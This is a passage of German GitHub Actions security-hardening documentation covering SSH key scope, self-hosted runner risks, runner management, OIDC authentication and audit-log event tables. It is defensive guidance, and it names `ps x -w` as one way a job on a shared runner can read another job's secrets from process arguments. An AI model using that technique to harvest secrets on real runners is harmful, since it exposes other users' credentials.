    - Workflows dürfen die SSH-Schlüssel niemals für ein persönliches Konto verwenden. Diese sind mit {% data variables.product.pat_v1_plural %} vergleichbar und gewähren Lese-/Schreibberechtigungen für alle deine persönlichen Repositorys sowie alle Repositorys, auf die du über die Organisationsmitgliedschaft zugreifen kannst.  Dadurch werden indirekt umfangreiche Zugriffsberechtigungen für alle Schreibzugriffsbenutzer*innen des Repositorys gewährt, in dem sich der Workflow befindet. Wenn du beabsichtigst, einen SSH-Schlüssel zu verwenden, weil du lediglich Klon- oder Pushvorgänge für ein Repository durchführst und nicht mit öffentlichen APIs interagieren müssen, solltest du stattdessen einzelne Bereitstellungsschlüssel verwenden.

## Härtung für selbstgehostete Runner

In {% ifversion fpt or ghec %} **{% data variables.product.prodname_dotcom %} gehostete** Runner führen Code innerhalb von kurzlebigen, bereinigten isolierten VMs aus. Diese Art von Umgebung kann also nicht dauerhaft kompromittiert werden. Auch ist kein Zugriff auf Informationen möglich, die über die Informationen hinausgehen, die während des Bootstrap-Prozesses in dieser Umgebung platziert wurden.
{% endif %}

{% ifversion fpt or ghec %}**Selbstgehostete**{% elsif ghes or ghae %}Selbstgehostete{% endif %} Runner für {% data variables.product.product_name %} bieten keine Garantien bezüglich der Ausführung in kurzlebigen bereinigten VMs und können durch nicht vertrauenswürdigen Code in einem Workflow dauerhaft gefährdet werden.

{% ifversion fpt or ghec %}Folglich sollten selbstgehostete Runner praktisch [nie für öffentliche Repositorys](/actions/hosting-your-own-runners/about-self-hosted-runners#self-hosted-runner-security) in {% data variables.product.product_name %} verwendet werden, da beliebige Benutzer*innen Pull Requests für das Repository aufrufen und die Umgebung gefährden können. Gehe ebenfalls{% elsif ghes or ghae %}Gehe{% endif %} mit Bedacht vor, wenn du selbstgehostete Runner für private oder interne Repositorys verwendest. In diesem Fall können alle Benutzer*innen, die das Repository forken und Pull Requests starten können (üblicherweise Benutzer*innen mit Lesezugriff auf das Repository), die selbstgehostete Runnerumgebung kompromittieren. Dabei kann u. a. auf Geheimnisse und das `GITHUB_TOKEN` zugegriffen werden, über das abhängig von den Einstellungen Schreibzugriff auf das Repository gewährt werden kann. Wenngleich der Zugriff auf Umgebungsgeheimnisse in Workflows durch die Verwendung von Umgebungen und erforderlichen Prüfungen gesteuert werden kann, werden diese Workflows nicht in einer isolierten Umgebung ausgeführt. Folglich müssen bei Ausführung in einem selbstgehosteten Runner dieselben Risiken berücksichtigt werden.

Wenn ein selbstgehosteter Runner auf Organisations- oder Unternehmensebene definiert wird, kann {% data variables.product.product_name %} Workflows aus mehreren Repositorys innerhalb desselben Runners planen. Sicherheitslücken oder Angriffe in diesen Umgebungen können also weitreichende Auswirkungen haben. Indem du deine selbstgehosteten Runner in separaten Gruppen organisierst, lässt sich der Umfang dieser Auswirkungen beschränken. Dabei kannst du einschränken, welche {% ifversion restrict-groups-to-workflows %}Workflows, {% endif %}Organisationen und Repositorys auf Runnergruppen zugreifen können. Weitere Informationen findest du unter [Verwalten des Zugriffs auf selbstgehostete Runner mithilfe von Gruppen](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups).

Außerdem solltest du die Umgebung der Computer des selbstgehosteten Runners berücksichtigen:
- Welche vertraulichen Informationen befinden sich auf dem Computer, der als selbstgehosteter Runner konfiguriert ist? Diese Informationen können z. B. private SSH-Schlüssel, API-Zugriffstoken usw. umfassen.
- Verfügt der Computer über Netzwerkzugriff auf vertrauliche Dienste? Dazu können z. B. Azure- oder AWS-Metadatendienste zählen. Die Menge an vertraulichen Informationen in dieser Umgebung sollte auf ein Minimum beschränkt werden. Du solltest immer bedenken, dass alle Benutzer*innen, die Workflows aufrufen können, Zugriff auf diese Umgebung haben.

Einige Kunden versuchen möglicherweise, diese Risiken zu mindern, indem sie Systeme implementieren, die den selbstgehosteten Runner nach jeder Auftragsausführung automatisch zerstören. Dieser Ansatz ist jedoch gegebenenfalls nicht so effektiv wie gewünscht, da nicht sichergestellt werden kann, dass ein selbstgehosteter Runner nur einen Auftrag ausführt. Einige Aufträge verwenden Geheimnisse als Befehlszeilenargumente, die für einen anderen Auftrag sichtbar sind, der im selben Runner ausgeführt wird (z. B. `ps x -w`). Folglich kann es zur Offenlegung von Geheimnissen kommen.

### Planen deiner Verwaltungsstrategie für selbstgehostete Runner

Selbstgehostete Runner können auf verschiedenen Ebenen in deiner {% data variables.product.prodname_dotcom %}-Hierarchie hinzugefügt werden: auf Unternehmens-, Organisations- oder Repositoryebene. Durch diese Platzierung wird festgelegt, wer einen Runner verwalten kann:

**Zentrale Verwaltung:**
  - Wenn ein zentrales Team Besitzer der selbstgehosteten Runner sein soll, solltest du deine Runner auf der höchsten gemeinsamen Organisations- oder Unternehmensebene hinzuzufügen. Dadurch kann dein Team deine Runner in einer zentralen Ansicht anzeigen und verwalten.
  - Wenn du nur über eine einzige Organisation verfügst, ist das Hinzufügen deiner Runner auf Organisationsebene der gleiche Ansatz. Dabei kann es jedoch zu Problemen kommen, wenn du zu einem späteren Zeitpunkt eine weitere Organisation hinzufügst.

**Dezentrale Verwaltung:**
  - Wenn jedes Team seine eigenen selbstgehosteten Runner verwalten soll, sollten die Runner auf der höchsten Ebene des Teambesitzes hinzugefügt werden. Beispiel: Wenn jedes Team über eine eigene Organisation verfügt, ist es am einfachsten, die Runner ebenfalls auf Organisationsebene hinzuzufügen.
  - Die Runner können auch auf Repositoryebene hinzugefügt werden. Da Runner in diesem Fall jedoch nicht von mehreren Repositorys gleichzeitig verwendet werden können, erhöht sich der Verwaltungsaufwand, und du benötigst eine größere Anzahl von Runnern.

{% ifversion fpt or ghec or ghes > 3.4 %}
### Authentifizieren bei deinem Cloudanbieter

Wenn du {% data variables.product.prodname_actions %} für die Bereitstellung bei einem Cloudanbieter verwendest oder beabsichtigst, HashiCorp Vault für die Verwaltung von Geheimnissen einzusetzen, solltest du die Verwendung von OpenID Connect in Betracht ziehen, um kurzlebige Zugriffstoken mit sorgfältig definiertem Gültigkeitsbereich für deine Workflowausführungen zu erstellen. Weitere Informationen findest du unter [About security hardening with OpenID Connect](/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect) („Informationen zur Sicherheitshärtung mit OpenID Connect“).

{% endif %}

## Überwachen von {% data variables.product.prodname_actions %}-Ereignissen

Über das Überwachungsprotokoll kannst du administrative Aufgaben in einer Organisation überwachen. Das Überwachungsprotokoll zeichnet die Art der Aktion, den Zeitpunkt der Ausführung sowie das persönliche Konto auf, das die Aktion ausgeführt hat.

So kannst du das Überwachungsprotokoll z. B. zum Aufzeichnen des `org.update_actions_secret`-Ereignisses verwenden, mit dem sich Änderungen an Organisationsgeheimnissen nachverfolgen lassen: ![Überwachungsprotokolleinträge](/assets/images/help/repository/audit-log-entries.png)

In der folgenden Tabelle sind die {% data variables.product.prodname_actions %}-Ereignisse beschrieben, die im Überwachungsprotokoll enthalten sind. Weitere Informationen zur Verwendung des Überwachungsprotokolls findest du unter [Reviewing the audit log for your organization](/organizations/keeping-your-organization-secure/reviewing-the-audit-log-for-your-organization#searching-the-audit-log) („Überprüfen des Überwachungsprotokolls für deine Organisation“) und [Reviewing audit logs for your enterprise](/admin/monitoring-activity-in-your-enterprise/reviewing-audit-logs-for-your-enterprise) („Überprüfen der Überwachungsprotokolle für dein Unternehmen“).

{% ifversion fpt or ghec %}
### Ereignisse für Umgebungen

| Aktion | BESCHREIBUNG
|------------------|-------------------
| `environment.create_actions_secret` | Wird ausgelöst, wenn ein Geheimnis in einer Umgebung erstellt wird. Weitere Informationen findest du unter [Environment secrets](/actions/reference/environments#environment-secrets) („Umgebungsgeheimnisse“).
| `environment.delete` | Wird ausgelöst, wenn eine Umgebung gelöscht wird. Weitere Informationen findest du unter [Deleting an environment](/actions/reference/environments#deleting-an-environment) („Löschen einer Umgebung“).
| `environment.remove_actions_secret` |  Wird ausgelöst, wenn ein Geheimnis aus einer Umgebung entfernt wird. Weitere Informationen findest du unter [Environment secrets](/actions/reference/environments#environment-secrets) („Umgebungsgeheimnisse“).
| `environment.update_actions_secret` | Wird ausgelöst, wenn ein Geheimnis in einer Umgebung aktualisiert wird. Weitere Informationen findest du unter [Environment secrets](/actions/reference/environments#environment-secrets) („Umgebungsgeheimnisse“).
{% endif %}

{% ifversion fpt or ghes or ghec %}
### Ereignisse für Konfigurationsänderungen
| Aktion | BESCHREIBUNG
|------------------|-------------------
| `repo.actions_enabled` | Wird ausgelöst, wenn {% data variables.product.prodname_actions %} für ein Repository aktiviert wird. Kann über die Benutzeroberfläche angezeigt werden. Dieses Ereignis ist nicht sichtbar, wenn du über die REST-API auf das Überwachungsprotokoll zugreifst. Weitere Informationen findest du unter [Using the REST API](#using-the-rest-api) („Verwenden der REST-API“).
| `repo.update_actions_access_settings` | Wird ausgelöst, wenn die Einstellung geändert wird, die steuert, wie dein Repository von {% data variables.product.prodname_actions %}-Workflows in anderen Repositorys verwendet wird.
{% endif %}

### Ereignisse für die Verwaltung von Geheimnissen
| Aktion | BESCHREIBUNG
|------------------|-------------------
| `org.create_actions_secret` | Wird ausgelöst, wenn ein {% data variables.product.prodname_actions %}-Geheimnis für eine Organisation erstellt wird. Weitere Informationen findest du unter [Creating encrypted secrets for an organization](/actions/reference/encrypted-secrets#creating-encrypted-secrets-for-an-organization) („Erstellen von verschlüsselten Geheimnissen für eine Organisation“).
| `org.remove_actions_secret` | Wird ausgelöst, wenn ein {% data variables.product.prodname_actions %}-Geheimnis entfernt wird.
| `org.update_actions_secret` | Wird ausgelöst, wenn ein {% data variables.product.prodname_actions %}-Geheimnis aktualisiert wird.
| `repo.create_actions_secret ` | Wird ausgelöst, wenn ein {% data variables.product.prodname_actions %}-Geheimnis für ein Repository erstellt wird. Weitere Informationen findest du unter [Creating encrypted secrets for a repository](/actions/reference/encrypted-secrets#creating-encrypted-secrets-for-a-repository) („Erstellen von verschlüsselten Geheimnissen für ein Repository“).
| `repo.remove_actions_secret` | Wird ausgelöst, wenn ein {% data variables.product.prodname_actions %}-Geheimnis entfernt wird.
| `repo.update_actions_secret` | Wird ausgelöst, wenn ein {% data variables.product.prodname_actions %}-Geheimnis aktualisiert wird.

### Ereignisse für selbstgehostete Runner
| Aktion | BESCHREIBUNG
|------------------|-------------------
| `enterprise.register_self_hosted_runner` | Wird ausgelöst, wenn ein neuer selbstgehosteter Runner registriert wird. Weitere Informationen findest du unter [Adding a self-hosted runner to an enterprise](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-an-enterprise) („Hinzufügen eines selbstgehosteten Runners zu einem Unternehmen“).
| `enterprise.remove_self_hosted_runner` | Wird ausgelöst, wenn ein selbstgehosteter Runner entfernt wird.
| `enterprise.runner_group_runners_updated` | Wird ausgelöst, wenn die Mitgliederliste einer Runnergruppe aktualisiert wird. Weitere Informationen findest du unter [Festlegen selbstgehosteter Runner in einer Gruppe für eine Organisation](/rest/reference/actions#set-self-hosted-runners-in-a-group-for-an-organization).
| `enterprise.self_hosted_runner_online` | Wird ausgelöst, wenn die Runneranwendung gestartet wird. Kann nur über die REST-API angezeigt werden. Über die Benutzeroberfläche oder im JSON/CSV-Export ist dieses Ereignis nicht sichtbar. Weitere Informationen findest du unter [Checking the status of a self-hosted runner](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner) („Überprüfen des Status eines selbstgehosteten Runners“).
| `enterprise.self_hosted_runner_offline` | Wird ausgelöst, wenn die Runneranwendung angehalten wird. Kann nur über die REST-API angezeigt werden. Über die Benutzeroberfläche oder im JSON/CSV-Export ist dieses Ereignis nicht sichtbar. Weitere Informationen findest du unter [Überprüfen des Status eines selbstgehosteten Runners](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner).
| `enterprise.self_hosted_runner_updated` | Wird ausgelöst, wenn die Runneranwendung aktualisiert wird. Kann über die REST-API und die Benutzeroberfläche angezeigt werden. Dieses Ereignis ist nicht enthalten, wenn du das Überwachungsprotokoll als JSON-Daten oder CSV-Datei exportierst. Weitere Informationen findest du unter [About self-hosted runners](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners) („Informationen zu selbstgehosteten Runnern“) und [Reviewing the audit log for your organization](/organizations/keeping-your-organization-secure/reviewing-the-audit-log-for-your-organization#exporting-the-audit-log) („Überprüfen des Überwachungsprotokolls für deine Organisation“).
| `org.register_self_hosted_runner` | Wird ausgelöst, wenn ein neuer selbstgehosteter Runner registriert wird. Weitere Informationen findest du unter [Adding a self-hosted runner to an organization](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-an-organization) („Hinzufügen eines selbstgehosteten Runners zu einer Organisation“).
| `org.remove_self_hosted_runner` | Wird ausgelöst, wenn ein selbstgehosteter Runner entfernt wird. Weitere Informationen findest du unter [Removing a runner from an organization](/actions/hosting-your-own-runners/removing-self-hosted-runners#removing-a-runner-from-an-organization) („Entfernen eines Runners aus einer Organisation“).
| `org.runner_group_runners_updated` | Wird ausgelöst, wenn die Mitgliederliste einer Runnergruppe aktualisiert wird. Weitere Informationen findest du unter [Set self-hosted runners in a group for an organization](/rest/reference/actions#set-self-hosted-runners-in-a-group-for-an-organization) („Festlegen von selbstgehosteten Runnern in einer Gruppe für eine Organisation“).
| `org.runner_group_updated` | Wird ausgelöst, wenn die Konfiguration einer selbstgehosteten Runnergruppe geändert wird. Weitere Informationen findest du unter [Ändern der Zugriffsrichtlinie einer selbstgehosteten Runnergruppe](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group).
| `org.self_hosted_runner_online` | Wird ausgelöst, wenn die Runneranwendung gestartet wird. Kann nur über die REST-API angezeigt werden. Über die Benutzeroberfläche oder im JSON/CSV-Export ist dieses Ereignis nicht sichtbar. Weitere Informationen findest du unter [Checking the status of a self-hosted runner](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner) („Überprüfen des Status eines selbstgehosteten Runners“).
| `org.self_hosted_runner_offline` | Wird ausgelöst, wenn die Runneranwendung angehalten wird. Kann nur über die REST-API angezeigt werden. Über die Benutzeroberfläche oder im JSON/CSV-Export ist dieses Ereignis nicht sichtbar. Weitere Informationen findest du unter [Überprüfen des Status eines selbstgehosteten Runners](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner).
| `org.self_hosted_runner_updated` | Wird ausgelöst, wenn die Runneranwendung aktualisiert wird. Kann über die REST-API und die Benutzeroberfläche angezeigt werden. Im JSON-/CSV-Export ist dieses Ereignis nicht sichtbar. Weitere Informationen findest du unter „[Informationen zu selbstgehosteten Runnern](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners)“.
| `repo.register_self_hosted_runner` | Wird ausgelöst, wenn ein neuer selbstgehosteter Runner registriert wird. Weitere Informationen findest du unter [Adding a self-hosted runner to a repository](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-a-repository) („Hinzufügen eines selbstgehosteten Runners zu einem Repository“).
| `repo.remove_self_hosted_runner` | Wird ausgelöst, wenn ein selbstgehosteter Runner entfernt wird. Weitere Informationen findest du unter [Entfernen eines Runners aus einem Repository](/actions/hosting-your-own-runners/removing-self-hosted-runners#removing-a-runner-from-a-repository).
| `repo.self_hosted_runner_online` | Wird ausgelöst, wenn die Runneranwendung gestartet wird. Kann nur über die REST-API angezeigt werden. Über die Benutzeroberfläche oder im JSON/CSV-Export ist dieses Ereignis nicht sichtbar. Weitere Informationen findest du unter [Checking the status of a self-hosted runner](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner) („Überprüfen des Status eines selbstgehosteten Runners“).
| `repo.self_hosted_runner_offline` | Wird ausgelöst, wenn die Runneranwendung angehalten wird. Kann nur über die REST-API angezeigt werden. Über die Benutzeroberfläche oder im JSON/CSV-Export ist dieses Ereignis nicht sichtbar. Weitere Informationen findest du unter [Überprüfen des Status eines selbstgehosteten Runners](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner).
| `repo.self_hosted_runner_updated` | Wird ausgelöst, wenn die Runneranwendung aktualisiert wird. Kann über die REST-API und die Benutzeroberfläche angezeigt werden. Im JSON-/CSV-Export ist dieses Ereignis nicht sichtbar. Weitere Informationen findest du unter „[Informationen zu selbstgehosteten Runnern](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners)“.

### Ereignisse für selbstgehostete Runnergruppen
| Aktion | BESCHREIBUNG
|------------------|-------------------
| `enterprise.runner_group_created` | Wird ausgelöst, wenn eine selbstgehostete Runnergruppe erstellt wird. Weitere Informationen findest du unter [Creating a self-hosted runner group for an enterprise](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#creating-a-self-hosted-runner-group-for-an-enterprise) („Erstellen einer selbstgehosteten Runnergruppe für ein Unternehmen“).
| `enterprise.runner_group_removed` | Wird ausgelöst, wenn eine selbstgehostete Runnergruppe entfernt wird. Weitere Informationen findest du unter [Removing a self-hosted runner group](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#removing-a-self-hosted-runner-group) („Entfernen einer selbstgehosteten Runnergruppe“).
| `enterprise.runner_group_runner_removed` | Wird ausgelöst, wenn die REST-API verwendet wird, um einen selbstgehosteten Runner aus einer Gruppe zu entfernen.
| `enterprise.runner_group_runners_added` | Wird ausgelöst, wenn ein selbstgehosteter Runner zu einer Gruppe hinzugefügt wird. Weitere Informationen findest du unter [Moving a self-hosted runner to a group](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#moving-a-self-hosted-runner-to-a-group) („Verschieben eines selbstgehosteten Runners in eine Gruppe“).
| `enterprise.runner_group_updated` |Wird ausgelöst, wenn die Konfiguration einer selbstgehosteten Runnergruppe geändert wird. Weitere Informationen findest du unter [Changing the access policy of a self-hosted runner group](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group) („Ändern der Zugriffsrichtlinie einer selbstgehosteten Runnergruppe“).
| `org.runner_group_created` | Wird ausgelöst, wenn eine selbstgehostete Runnergruppe erstellt wird. Weitere Informationen findest du unter [Creating a self-hosted runner group for an organization](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#creating-a-self-hosted-runner-group-for-an-organization) („Erstellen einer selbstgehosteten Runnergruppe für eine Organisation“).
| `org.runner_group_removed` | Wird ausgelöst, wenn eine selbstgehostete Runnergruppe entfernt wird. Weitere Informationen findest du unter [Removing a self-hosted runner group](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#removing-a-self-hosted-runner-group) („Entfernen einer selbstgehosteten Runnergruppe“).
| `org.runner_group_updated` | Wird ausgelöst, wenn die Konfiguration einer selbstgehosteten Runnergruppe geändert wird. Weitere Informationen findest du unter [Changing the access policy of a self-hosted runner group](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group) („Ändern der Zugriffsrichtlinie einer selbstgehosteten Runnergruppe“).
| `org.runner_group_runners_added` | Wird ausgelöst, wenn ein selbstgehosteter Runner zu einer Gruppe hinzugefügt wird. Weitere Informationen findest du unter [Moving a self-hosted runner to a group](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#moving-a-self-hosted-runner-to-a-group) („Verschieben eines selbstgehosteten Runners in eine Gruppe“).
| `org.runner_group_runner_removed` | Wird ausgelöst, wenn die REST-API verwendet wird, um einen selbstgehosteten Runner aus einer Gruppe zu entfernen. Weitere Informationen findest du unter [Remove a self-hosted runner from a group for an organization](/rest/reference/actions#remove-a-self-hosted-runner-from-a-group-for-an-organization) („Entfernen eines selbstgehosteten Runners aus einer Gruppe für eine Organisation“).

### Ereignisse für Workflowaktivitäten

{% data reusables.actions.actions-audit-events-workflow %}
